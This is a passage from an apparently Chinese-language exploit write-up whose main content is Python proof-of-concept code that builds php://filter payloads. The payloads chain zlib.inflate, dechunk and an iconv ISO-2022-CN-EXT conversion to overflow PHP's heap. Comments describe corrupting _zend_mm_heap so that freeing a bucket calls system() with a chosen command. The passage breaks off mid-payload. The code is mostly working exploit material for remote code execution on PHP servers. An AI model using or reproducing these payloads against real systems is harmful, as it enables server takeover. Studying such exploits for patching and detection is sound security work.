</span><span style="color:#c0c5ce;">	### step2 释放B A；free_slot：A-&gt;B-&gt;C
</span><span style="color:#c0c5ce;">	# Step 2: Put fake pointer and make FL order back to normal
</span><span style="color:#c0c5ce;">	&quot;dechunk&quot;,
</span><span style="color:#c0c5ce;">	&quot;convert.iconv.L1.L1&quot;, 
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	### step3_overflow 申请0x100 A，越界写入0x48
</span><span style="color:#c0c5ce;">	##                 free_slot：B-&gt;C_0x48-&gt;_zend_mm_heap
</span><span style="color:#c0c5ce;">	# Step 3: Trigger overflow
</span><span style="color:#c0c5ce;">	&quot;dechunk&quot;,
</span><span style="color:#c0c5ce;">	&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	### step3_overflow 释放A;free_slot：A-&gt;B-&gt;C_0x48-&gt;_zend_mm_heap
</span><span style="color:#c0c5ce;">	### step4 申请3个0x100 chunk A B C_0x48
</span><span style="color:#c0c5ce;">	### step4_pwn 申请0x100 控制0x18和0x140 freeslot
</span><span style="color:#c0c5ce;">	### step4_custom_heap 申请0x18 chunk 布置system指针
</span><span style="color:#c0c5ce;">	### step4_use_custom_heap 申请0x140，内存位于_zend_mm_heap;写入命令并覆盖custom_heap标志位。调用php_stream_bucket_delref释放处理的bucket时调用free，触发system(xxx)
</span><span style="color:#c0c5ce;">	# Step 4: Allocate at arbitrary address and change zend_mm_heap
</span><span style="color:#c0c5ce;">	&quot;convert.quoted-printable-decode&quot;,
</span><span style="color:#c0c5ce;">	&quot;convert.iconv.L1.L1&quot;,
</span><span style="color:#c0c5ce;">]
</span></pre>
<h2 id="poc">poc</h2><pre style="background-color:#2b303b;">
<span style="color:#65737e;">#!/usr/bin/env python3
</span><span style="color:#65737e;"># -*- coding=utf-8 -*-
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">zlib
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">base64
</span><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">p64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: int) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">int.</span><span style="color:#8fa1b3;">to_bytes</span><span style="color:#c0c5ce;">(data, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">little</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># 该函数对数据进行zlib压缩，让php的zlib.inflate进行解压缩
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.
</span><span style="color:#65737e;">    &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># Remove 2-byte header and 4-byte checksum
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">zlib.</span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(data, </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">)[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">]
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># 对数据纪念下quoted printable编码，php解码使用的是convert.quoted-printable-decode
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">qpe</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: bytes) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Emulates quoted-printable-encode.
</span><span style="color:#65737e;">    &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&quot;&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">=</span><span style="color:#c0c5ce;">{x</span><span style="color:#d08770;">:02x</span><span style="color:#c0c5ce;">}&quot; </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">x </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">data).</span><span style="color:#8fa1b3;">upper</span><span style="color:#c0c5ce;">().</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># 最终填充到0x8000长度的数据
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: bytes) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(data, </span><span style="color:#d08770;">0x8000</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># 进行HTTP CHUNKED编码，php使用dechunk
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: bytes, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">: int = </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the
</span><span style="color:#65737e;">    chunked representation has size `size`.
</span><span style="color:#65737e;">    For instance, `ABCD` with size 10 becomes: `0004</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">ABCD</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">`.
</span><span style="color:#65737e;">    没有指定size时，先加8预留字节 实际构造出的size还是传入data的长度
</span><span style="color:#65737e;">    如果指定size，填充至指定size，实际size为data长度
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">    说白了是否指定size，编码出长度都是data长度
</span><span style="color:#65737e;">    但根据编码，如果指定了size，一般当前data长度小于0x100，则下一次chunk编码才会得到0x100长度的chunk
</span><span style="color:#65737e;">    &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># The caller does not care about the size: let&#39;s just add 8, which is more than
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># enough
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">size is </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        size = </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(data) + </span><span style="color:#d08770;">8
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(size))
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(data)
</span><span style="color:#c0c5ce;">    keep = </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(data) + </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n\n</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 填充0
</span><span style="color:#c0c5ce;">    size = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(data)</span><span style="color:#d08770;">:x</span><span style="color:#c0c5ce;">}&quot;.</span><span style="color:#8fa1b3;">rjust</span><span style="color:#c0c5ce;">(size - keep, &quot;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(size)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">size.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">() + </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; + data + </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">chunked_add_bad_data</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">: bytes, </span><span style="color:#bf616a;">badData</span><span style="color:#c0c5ce;">: bytes, </span><span style="color:#bf616a;">totalsize</span><span style="color:#c0c5ce;">: int)-&gt;bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
</span><span style="color:#65737e;">    php处理dechunk的时候有一个问题，首先判断长度，只处理0-9, A-F, a-f这些字符。
</span><span style="color:#65737e;">    如果判断非这些字符，就会判断为处理长度结束，接着会判断下一个字符是否是</span><span style="color:#96b5b4;">\r</span><span style="color:#65737e;">或者</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">，如果不是则跳过。
</span><span style="color:#65737e;">    这让我们可以在长度和</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">之间注入其他字符，这些字符有以下要求，开始的值不能为十六进制，中间不能含有</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">或者</span><span style="color:#96b5b4;">\r</span><span style="color:#65737e;">。
</span><span style="color:#65737e;">    一个示例：
</span><span style="color:#65737e;">    b&#39;00000010........</span><span style="color:#96b5b4;">\x00</span><span style="color:#65737e;">A</span><span style="color:#96b5b4;">\x00\x00\x00\x00\x00\x00</span><span style="color:#65737e;">AAAAAA</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">000008</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">AAAAAAAA</span><span style="color:#96b5b4;">\n\n</span><span style="color:#65737e;">&#39;
</span><span style="color:#65737e;">    这样往堆的0x10地址注入了0x4100
</span><span style="color:#65737e;">    不过这种方案限制比较大，如果php的_zend_mm_heap地址包含0x0a或者0x0d，就不能用了
</span><span style="color:#65737e;">    &#39;&#39;&#39;
</span><span style="color:#c0c5ce;">    dataSize = </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(data)
</span><span style="color:#c0c5ce;">    chunk = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;{dataSize</span><span style="color:#d08770;">:x</span><span style="color:#c0c5ce;">}&quot;.</span><span style="color:#8fa1b3;">rjust</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">    chunk = chunk.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">() + </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">.</span><span style="color:#c0c5ce;">&quot; * </span><span style="color:#d08770;">8 </span><span style="color:#c0c5ce;">+ badData
</span><span style="color:#c0c5ce;">    end = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; + data + </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    chunk += </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot; * (totalsize - </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(chunk) - </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(end))
</span><span style="color:#c0c5ce;">    chunk += end
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(chunk) == totalsize
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">chunk    
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># 做了点修改，把chunk函数删除了，因为payload的构造不一样，所以使用chunk函数会有不同
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">ptr_bucket</span><span style="color:#c0c5ce;">(*</span><span style="color:#bf616a;">ptrs</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">) -&gt; bytes:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">size is not </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(ptrs) * </span><span style="color:#d08770;">8 </span><span style="color:#c0c5ce;">== size
</span><span style="color:#c0c5ce;">    bucket = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">map</span><span style="color:#c0c5ce;">(p64, ptrs))
</span><span style="color:#c0c5ce;">    bucket = </span><span style="color:#8fa1b3;">qpe</span><span style="color:#c0c5ce;">(bucket)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">bucket
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">buildPayload1</span><span style="color:#c0c5ce;">() -&gt; str:
</span><span style="color:#c0c5ce;">    payload = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;&quot;
</span><span style="color:#c0c5ce;">    pages = (
</span><span style="color:#c0c5ce;">        payload
</span><span style="color:#c0c5ce;">    )
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(pages)
</span><span style="color:#c0c5ce;">    resource = base64.</span><span style="color:#8fa1b3;">b64encode</span><span style="color:#c0c5ce;">(resource)
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">data:text/plain;base64,</span><span style="color:#c0c5ce;">{resource.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()}&quot;
</span><span style="color:#c0c5ce;">    filters = [
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">zlib.inflate</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">    ]
</span><span style="color:#c0c5ce;">    filters = &quot;</span><span style="color:#a3be8c;">|</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(filters)
</span><span style="color:#c0c5ce;">    path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter/read=</span><span style="color:#c0c5ce;">{filters}</span><span style="color:#a3be8c;">/resource=</span><span style="color:#c0c5ce;">{resource}&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">path
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">buildPayload2</span><span style="color:#c0c5ce;">() -&gt; str:
</span><span style="color:#c0c5ce;">    heapSize = </span><span style="color:#d08770;">0x100
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    step1 = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot; * heapSize
</span><span style="color:#c0c5ce;">    step1 = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step1)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pages = (
</span><span style="color:#c0c5ce;">        step1*</span><span style="color:#d08770;">5
</span><span style="color:#c0c5ce;">    )
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(pages)
</span><span style="color:#c0c5ce;">    resource = base64.</span><span style="color:#8fa1b3;">b64encode</span><span style="color:#c0c5ce;">(resource)
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">data:text/plain;base64,</span><span style="color:#c0c5ce;">{resource.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()}&quot;
</span><span style="color:#c0c5ce;">    filters = [
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># zlib解压缩
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">zlib.inflate</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 让php分配0x100大小的堆
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.latin1.latin1</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    ]
</span><span style="color:#c0c5ce;">    filters = &quot;</span><span style="color:#a3be8c;">|</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(filters)
</span><span style="color:#c0c5ce;">    path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter/read=</span><span style="color:#c0c5ce;">{filters}</span><span style="color:#a3be8c;">/resource=</span><span style="color:#c0c5ce;">{resource}&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">path
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">buildPayload3</span><span style="color:#c0c5ce;">() -&gt; str:
</span><span style="color:#c0c5ce;">    heapSize = </span><span style="color:#d08770;">0x100
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    step1 = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot; * </span><span style="color:#d08770;">0x10
</span><span style="color:#c0c5ce;">    step1 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step1, heapSize)
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(step1.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">())
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">exit</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    step1 = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step1)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pages = (
</span><span style="color:#c0c5ce;">        step1*</span><span style="color:#d08770;">5
</span><span style="color:#c0c5ce;">    )
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(pages)
</span><span style="color:#c0c5ce;">    resource = base64.</span><span style="color:#8fa1b3;">b64encode</span><span style="color:#c0c5ce;">(resource)
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">data:text/plain;base64,</span><span style="color:#c0c5ce;">{resource.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()}&quot;
</span><span style="color:#c0c5ce;">    filters = [
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># zlib解压缩
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">zlib.inflate</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 让php分配0x100大小的堆
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.latin1.latin1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 释放0x100大小的堆
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.latin1.latin1</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    ]
</span><span style="color:#c0c5ce;">    filters = &quot;</span><span style="color:#a3be8c;">|</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(filters)
</span><span style="color:#c0c5ce;">    path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter/read=</span><span style="color:#c0c5ce;">{filters}</span><span style="color:#a3be8c;">/resource=</span><span style="color:#c0c5ce;">{resource}&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">path
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">buildPayload4</span><span style="color:#c0c5ce;">() -&gt; str:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
</span><span style="color:#65737e;">    我们把一次处理dechunk + convert.iconv.的过程算一步
</span><span style="color:#65737e;">    &#39;&#39;&#39;
</span><span style="color:#c0c5ce;">    heapSize = </span><span style="color:#d08770;">0x100
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">BUG </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">劄</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">utf-8</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第一步申请0x100的堆，第二步释放
</span><span style="color:#c0c5ce;">    step1_malloc_step2_free = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot; * </span><span style="color:#d08770;">0x10
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三次dechunk，长度小于0x100
</span><span style="color:#c0c5ce;">    step1_malloc_step2_free = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step1_malloc_step2_free)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第二次dechunk，长度小于0x100
</span><span style="color:#c0c5ce;">    step1_malloc_step2_free = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step1_malloc_step2_free, heapSize)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第一次dechunk，长度等于0x100
</span><span style="color:#c0c5ce;">    step1_malloc_step2_free = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step1_malloc_step2_free)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第二步申请0x100的堆，第三步释放
</span><span style="color:#c0c5ce;">    step2_malloc_step3_free = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&quot; * </span><span style="color:#d08770;">0x20
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三次dechunk，长度小于0x100
</span><span style="color:#c0c5ce;">    step2_malloc_step3_free = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step2_malloc_step3_free, heapSize)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第二次dechunk，长度等于0x100
</span><span style="color:#c0c5ce;">    step2_malloc_step3_free = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step2_malloc_step3_free)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第一次dechunk，长度大于0x100
</span><span style="color:#c0c5ce;">    step2_malloc_step3_free = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step2_malloc_step3_free)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三步触发bug
</span><span style="color:#c0c5ce;">    step3_trigger_bug = (</span><span style="color:#d08770;">0x100 </span><span style="color:#c0c5ce;">- </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">BUG</span><span style="color:#c0c5ce;">)) * </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#bf616a;">BUG
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 确保长度为0x100
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(step3_trigger_bug) == </span><span style="color:#d08770;">0x100
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三次dechunk，长度等于0x100
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    step3_trigger_bug = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3_trigger_bug)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第二次dechunk，长度大于0x100
</span><span style="color:#c0c5ce;">    step3_trigger_bug = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3_trigger_bug)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第一次dechunk，长度大于0x100
</span><span style="color:#c0c5ce;">    step3_trigger_bug = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step3_trigger_bug)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pages = (
</span><span style="color:#c0c5ce;">        step1_malloc_step2_free * </span><span style="color:#d08770;">3 </span><span style="color:#c0c5ce;">+
</span><span style="color:#c0c5ce;">        step2_malloc_step3_free * </span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">+
</span><span style="color:#c0c5ce;">        step3_trigger_bug
</span><span style="color:#c0c5ce;">    )
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(pages)
</span><span style="color:#c0c5ce;">    resource = base64.</span><span style="color:#8fa1b3;">b64encode</span><span style="color:#c0c5ce;">(resource)
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">data:text/plain;base64,</span><span style="color:#c0c5ce;">{resource.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()}&quot;
</span><span style="color:#c0c5ce;">    filters = [
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># zlib解压缩
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">zlib.inflate</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 第一步
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.latin1.latin1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 第二步
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.latin1.latin1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 第三步触发漏洞
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
